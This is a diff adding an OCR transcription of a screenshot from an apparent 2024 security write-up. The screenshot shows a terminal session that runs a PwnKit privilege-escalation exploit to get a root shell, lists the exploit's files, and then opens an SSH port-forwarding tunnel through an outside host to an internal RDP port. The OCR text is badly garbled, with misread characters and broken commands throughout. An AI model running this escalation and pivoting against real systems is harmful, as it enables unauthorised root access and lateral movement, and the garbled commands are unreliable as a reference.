@@ -1,0 +1,36 @@
+# OCR: 8488f0c79ebf9b0548cdbc0d8ace0670.jpg
+# 来源: .\02-WriteUp\2024\8488f0c79ebf9b0548cdbc0d8ace0670.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:34
+
+[wm@locathost Pwnkit-Exploit-main]$ ./exp
+exploit
+[Current User before execute exploit
+hackergvictinSwhoaml: ian
+Exploit written by Gluijait (0x6¢75696a616974)ekdir: cannot create directory -
+Inkdir: cannot create directory ...tmp...: File exists
+\GCOW_PATHE....1 File exists
+[+] Enjoy your root if exploit was completed succesfully
+bash: no Job control in this shell
+[root@localhost Pwnkit-exploit-nain}# 1s
+as
+bespayloadgen.2h
+exploit
+exploit.c
+wn
+License
+Makefile
+punkitesdecoded.<
+it-Exploit-aain}# cd
+jLication}# ssh cpna 22222;192.168,100.254:3369 root§222.2.2.2 -p33333
+1222: 192,168. 100. 254:3389 r
+0.0.0:22222:192.168.100.254:3389 ro SS
+luarning: Permanently added *[222-2.2.2]:33333" (ECDSA) to the list of known hosts.
+[root@localhost application]#
+(0t8222.2.2.2 -p33333
+PET), BESS ORTH 3orudsan
+[SAIS (1900 bytes) Show data as (ASCII
+aaa
+am
+| 0)
+E
